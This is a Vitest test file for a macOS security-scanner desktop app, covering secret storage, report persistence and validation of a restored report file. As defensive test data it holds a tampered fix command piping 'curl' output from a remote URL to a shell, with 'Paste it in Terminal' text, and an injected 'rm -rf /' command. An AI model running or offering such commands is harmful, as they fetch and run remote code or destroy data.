import { invoke } from "@tauri-apps/api/core";
import { MACOS_CATALOG, SECTION_KEYS, computeScore, headlineFor, type FixCommand, type RuleResult, type ScanReport } from "@talos/core";
import { beforeEach, describe, expect, it, vi } from "vitest";
import { FileReportStore, restoreReport } from "./file-report-store";
import { KeychainSecretStore } from "./keychain-secret-store";
import { openAssistant } from "./open-assistant";
import { openSettingsPane } from "./settings-pane";
import { TEST_REPORT } from "./test-fixtures";

vi.mock("@tauri-apps/api/core", () => ({ invoke: vi.fn() }));

const invokeMock = vi.mocked(invoke);

beforeEach(() => {
  invokeMock.mockReset();
});

describe("KeychainSecretStore", () => {
  it("reads, writes and deletes through the secret commands", async () => {
    const store = new KeychainSecretStore();
    invokeMock.mockResolvedValueOnce("sk-ant-test");
    expect(await store.get("anthropic_api_key")).toBe("sk-ant-test");
    expect(invokeMock).toHaveBeenCalledWith("secret_get", { name: "anthropic_api_key" });

    await store.set("anthropic_api_key", "sk-ant-new");
    expect(invokeMock).toHaveBeenCalledWith("secret_set", { name: "anthropic_api_key", value: "sk-ant-new" });

    await store.delete("anthropic_api_key");
    expect(invokeMock).toHaveBeenCalledWith("secret_delete", { name: "anthropic_api_key" });
  });

  it("treats null and empty values as absent", async () => {
    const store = new KeychainSecretStore();
    invokeMock.mockResolvedValueOnce(null);
    expect(await store.get("anthropic_api_key")).toBeNull();
    invokeMock.mockResolvedValueOnce("");
    expect(await store.get("anthropic_api_key")).toBeNull();
  });
});

function rule(ruleId: string) {
  const found = MACOS_CATALOG.rules.find((r) => r.id === ruleId);
  if (found === undefined) throw new Error(`no rule ${ruleId}`);
  return found;
}

/** TEST_REPORT with one top-level field removed. */
function without(key: keyof ScanReport): Record<string, unknown> {
  const copy: Record<string, unknown> = { ...TEST_REPORT };
  delete copy[key];
  return copy;
}

/** The exact file shape that used to restore and then crash Overview and Findings at boot. */
const CORRUPT_LAST_REPORT = {
  schemaVersion: 1,
  reportId: "x",
  findings: [],
  score: { value: 50, grade: "poor", deducted: 0, cappedByCritical: false, complete: false, counts: { pass: 0, fail: 0, review: 0, unknown: 1, not_applicable: 0 } },
  results: [{ ruleId: "TL-MAC-019", status: "unknown", unknownReason: "permission_denied", evidence: [], points: 0 }],
};

const CURL: FixCommand = {
  program: "curl",
  args: ["-fsSL", "https://x/a|sh"],
  needsAdmin: true,
  interactive: false,
  appliesTo: null,
};

describe("FileReportStore", () => {
  it("saves the report and serves it from memory afterwards", async () => {
    const store = new FileReportStore(MACOS_CATALOG);
    invokeMock.mockResolvedValueOnce(undefined);
    await store.saveLast(TEST_REPORT);
    expect(invokeMock).toHaveBeenCalledWith("report_save_last", { report: TEST_REPORT });
    expect(await store.current()).toBe(TEST_REPORT);
    expect(invokeMock).toHaveBeenCalledTimes(1);
  });

  it("loads the last report from disk, rebuilding findings from the catalog", async () => {
    const store = new FileReportStore(MACOS_CATALOG);
    invokeMock.mockResolvedValueOnce(TEST_REPORT);
    const loaded = await store.loadLast();
    expect(loaded).not.toBeNull();
    expect(loaded?.reportId).toBe(TEST_REPORT.reportId);
    expect(loaded?.score).toEqual(TEST_REPORT.score);
    expect(loaded?.results.map((r) => [r.ruleId, r.status, r.points])).toEqual(
      TEST_REPORT.results.map((r) => [r.ruleId, r.status, r.points]),
    );
    expect(loaded?.findings.map((f) => f.ruleId)).toEqual(TEST_REPORT.findings.map((f) => f.ruleId));
    for (const finding of loaded?.findings ?? []) {
      const catalogRule = rule(finding.ruleId);
      expect(finding.title).toBe(catalogRule.title);
      expect(finding.headline).toBe(headlineFor(catalogRule, finding.status));
      expect(finding.explanation).toBe(catalogRule.explanation);
      expect(finding.fix).toBe(catalogRule.fix);
      expect(finding.severity).toBe(catalogRule.severity);
    }
    expect(await store.current()).toBe(loaded);
  });

  it("ignores malformed data", async () => {
    const store = new FileReportStore(MACOS_CATALOG);
    invokeMock.mockResolvedValueOnce({ hello: "world" });
    expect(await store.loadLast()).toBeNull();
    invokeMock.mockResolvedValueOnce(null);
    expect(await store.loadLast()).toBeNull();
    invokeMock.mockResolvedValueOnce(CORRUPT_LAST_REPORT);
    expect(await store.loadLast()).toBeNull();
    expect(await store.current()).toBeNull();
  });

  it("current() falls back to disk and swallows a read failure", async () => {
    const store = new FileReportStore(MACOS_CATALOG);
    invokeMock.mockRejectedValueOnce("no such file");
    expect(await store.current()).toBeNull();
  });
});

describe("restoreReport", () => {
  it("never takes fix commands or text from the file", () => {
    const first = TEST_REPORT.findings[0]!;
    const tampered = {
      ...TEST_REPORT,
      findings: [{ ...first, title: "Run this", headline: "Run this now", explanation: "Paste it in Terminal.", fix: { ...first.fix, commands: [CURL] } }],
    };
    const restored = restoreReport(MACOS_CATALOG, tampered);
    const finding = restored?.findings.find((f) => f.ruleId === first.ruleId);
    expect(finding?.fix).toBe(rule(first.ruleId).fix);
    expect(finding?.title).toBe(rule(first.ruleId).title);
    expect(finding?.headline).toBe(rule(first.ruleId).failTitle);
    expect(restored?.findings.flatMap((f) => f.fix.commands).some((c) => c.program === "curl")).toBe(false);
  });

  it("derives findings from results, not from the persisted findings array", () => {
    const withoutFindings = { ...TEST_REPORT, findings: [] };
    expect(restoreReport(MACOS_CATALOG, withoutFindings)?.findings.map((f) => f.ruleId)).toEqual([
      "TL-MAC-001",
      "TL-MAC-002",
      "TL-MAC-023",
    ]);
  });

  it("drops evidence keys the rule does not declare", () => {
    const restored = restoreReport(MACOS_CATALOG, TEST_REPORT);
    // TL-MAC-002 declares "enabled"; TL-MAC-001 does not.
    expect(restored?.results.find((r) => r.ruleId === "TL-MAC-002")?.evidence).toEqual(
      TEST_REPORT.results.find((r) => r.ruleId === "TL-MAC-002")?.evidence,
    );
    expect(restored?.results.find((r) => r.ruleId === "TL-MAC-001")?.evidence).toEqual([]);
  });

  it("returns null when a result names a rule outside the catalog", () => {
    const stray: RuleResult = { ruleId: "TL-MAC-999", status: "fail", evidence: [], unknownReason: null, points: 8 };
    expect(restoreReport(MACOS_CATALOG, { ...TEST_REPORT, results: [...TEST_REPORT.results, stray] })).toBeNull();
  });

  it("returns null for a malformed or duplicated result", () => {
    const good = TEST_REPORT.results[0]!;
    expect(restoreReport(MACOS_CATALOG, { ...TEST_REPORT, results: [{ ...good, status: "owned" }] })).toBeNull();
    expect(restoreReport(MACOS_CATALOG, { ...TEST_REPORT, results: [{ ...good, unknownReason: "nope" }] })).toBeNull();
    expect(restoreReport(MACOS_CATALOG, { ...TEST_REPORT, results: [{ ...good, evidence: [{ key: 1 }] }] })).toBeNull();
    expect(restoreReport(MACOS_CATALOG, { ...TEST_REPORT, results: [{ ...good, points: "8" }] })).toBeNull();
    expect(restoreReport(MACOS_CATALOG, { ...TEST_REPORT, results: [good, good] })).toBeNull();
    expect(restoreReport(MACOS_CATALOG, { ...TEST_REPORT, results: ["TL-MAC-001"] })).toBeNull();
  });

  it("returns null when a header field the screens read is missing or malformed", () => {
    const required = ["sections", "platform", "scannedAt", "collectedAt", "coreVersion", "catalogVersion", "cisEdition", "results"] as const;
    for (const key of required) {
      expect(restoreReport(MACOS_CATALOG, without(key)), key).toBeNull();
    }
    expect(restoreReport(MACOS_CATALOG, { ...TEST_REPORT, schemaVersion: 2 })).toBeNull();
    expect(restoreReport(MACOS_CATALOG, { ...TEST_REPORT, reportId: 7 })).toBeNull();
    expect(restoreReport(MACOS_CATALOG, { ...TEST_REPORT, scannedAt: "garbage" })).toBeNull();
    expect(restoreReport(MACOS_CATALOG, { ...TEST_REPORT, collectedAt: 1760522340000 })).toBeNull();
    expect(restoreReport(MACOS_CATALOG, { ...TEST_REPORT, coreVersion: null })).toBeNull();
  });

  it("returns null when the sections summary is incomplete or malformed", () => {
    const sections = TEST_REPORT.sections;
    expect(restoreReport(MACOS_CATALOG, { ...TEST_REPORT, sections: {} })).toBeNull();
    expect(restoreReport(MACOS_CATALOG, { ...TEST_REPORT, sections: [] })).toBeNull();
    expect(restoreReport(MACOS_CATALOG, { ...TEST_REPORT, sections: { ...sections, listeners: null } })).toBeNull();
    expect(restoreReport(MACOS_CATALOG, { ...TEST_REPORT, sections: { ...sections, listeners: { status: "broken" } } })).toBeNull();
    expect(restoreReport(MACOS_CATALOG, { ...TEST_REPORT, sections: { ...sections, listeners: { status: "unavailable" } } })).toBeNull();
    expect(restoreReport(MACOS_CATALOG, { ...TEST_REPORT, sections: { ...sections, listeners: { status: "unavailable", reason: "nope" } } })).toBeNull();
  });

  it("keeps each section's status and reason but never collected data or extra keys", () => {
    const sections = TEST_REPORT.sections;
    const withData = { ...sections, listeners: { status: "ok", data: { entries: [{ port: 22 }] } }, extra: { status: "ok" } };
    const restored = restoreReport(MACOS_CATALOG, { ...TEST_REPORT, sections: withData });
    expect(restored?.sections.listeners).toEqual({ status: "ok" });
    expect(Object.keys(restored?.sections ?? {})).toEqual([...SECTION_KEYS]);
    const hidden = { ...sections, listeners: { status: "unavailable", reason: "permission_denied", detail: "stderr text" } };
    expect(restoreReport(MACOS_CATALOG, { ...TEST_REPORT, sections: hidden })?.sections.listeners).toEqual({
      status: "unavailable",
      reason: "permission_denied",
    });
  });

  it("returns null when the platform is not a host, and keeps only the host fields", () => {
    const platform = TEST_REPORT.platform;
    expect(restoreReport(MACOS_CATALOG, { ...TEST_REPORT, platform: {} })).toBeNull();
    expect(restoreReport(MACOS_CATALOG, { ...TEST_REPORT, platform: "macos" })).toBeNull();
    expect(restoreReport(MACOS_CATALOG, { ...TEST_REPORT, platform: { ...platform, os: "beos" } })).toBeNull();
    expect(restoreReport(MACOS_CATALOG, { ...TEST_REPORT, platform: { ...platform, arch: "mips" } })).toBeNull();
    expect(restoreReport(MACOS_CATALOG, { ...TEST_REPORT, platform: { ...platform, osVersion: 27 } })).toBeNull();
    expect(restoreReport(MACOS_CATALOG, { ...TEST_REPORT, platform: { ...platform, osBuild: 1 } })).toBeNull();
    expect(restoreReport(MACOS_CATALOG, { ...TEST_REPORT, platform: { ...platform, collectorVersion: undefined } })).toBeNull();
    expect(restoreReport(MACOS_CATALOG, { ...TEST_REPORT, platform: { ...platform, hostname: "my-mac" } })?.platform).toEqual(platform);
  });

  it("recomputes the score from the results instead of trusting the file", () => {
    const expected = computeScore(
      TEST_REPORT.results.map((r) => rule(r.ruleId)),
      TEST_REPORT.results,
    );
    expect(expected).toEqual(TEST_REPORT.score);
    const bogus = [{}, { value: 150, grade: "good" }, { value: Number.NaN, grade: "poor" }, { value: "50", grade: "poor" }, { value: 50 }, null, "fine"];
    for (const score of bogus) {
      expect(restoreReport(MACOS_CATALOG, { ...TEST_REPORT, score })?.score, JSON.stringify(score)).toEqual(expected);
    }
  });

  it("gives a null score and an unknown finding when the only result is unknown", () => {
    const unknown: RuleResult = { ruleId: "TL-MAC-019", status: "unknown", evidence: [], unknownReason: "permission_denied", points: 0 };
    const restored = restoreReport(MACOS_CATALOG, { ...TEST_REPORT, results: [unknown], score: {} });
    expect(restored?.score).toEqual({
      value: null,
      grade: null,
      deducted: 0,
      cappedByCritical: false,
      complete: false,
      counts: { pass: 0, fail: 0, review: 0, unknown: 1, not_applicable: 0 },
    });
    expect(restored?.findings.map((f) => f.ruleId)).toEqual(["TL-MAC-019"]);
  });

  it("rejects the corrupt file that used to blank the window", () => {
    expect(restoreReport(MACOS_CATALOG, CORRUPT_LAST_REPORT)).toBeNull();
    expect(restoreReport(MACOS_CATALOG, { ...CORRUPT_LAST_REPORT, score: {} })).toBeNull();
    expect(restoreReport(MACOS_CATALOG, { ...CORRUPT_LAST_REPORT, sections: {}, platform: {}, scannedAt: "garbage" })).toBeNull();
  });

  it("carries nothing from the file beyond the report schema", () => {
    const restored = restoreReport(MACOS_CATALOG, { ...TEST_REPORT, note: "hand edited", commands: ["rm -rf /"] });
    expect(restored).not.toBeNull();
    expect(Object.keys(restored ?? {}).sort()).toEqual(Object.keys(TEST_REPORT).sort());
  });
});

describe("openSettingsPane", () => {
  it("passes the pane name only", async () => {
    invokeMock.mockResolvedValueOnce(undefined);
    await openSettingsPane("full_disk_access");
    expect(invokeMock).toHaveBeenCalledWith("open_settings_pane", { pane: "full_disk_access" });
  });
});

describe("openAssistant", () => {
  it("passes the assistant id and the prompt, never a URL", async () => {
    invokeMock.mockResolvedValueOnce(undefined);
    await openAssistant("chatgpt", "Explain my results.");
    expect(invokeMock).toHaveBeenCalledWith("open_assistant", { assistant: "chatgpt", prompt: "Explain my results." });
    const args = invokeMock.mock.calls[0]?.[1] as Record<string, unknown>;
    expect(Object.keys(args).sort()).toEqual(["assistant", "prompt"]);
  });

  it("surfaces a rejection from Rust", async () => {
    invokeMock.mockRejectedValueOnce("prompt too long");
    await expect(openAssistant("claude", "x")).rejects.toBe("prompt too long");
  });
});
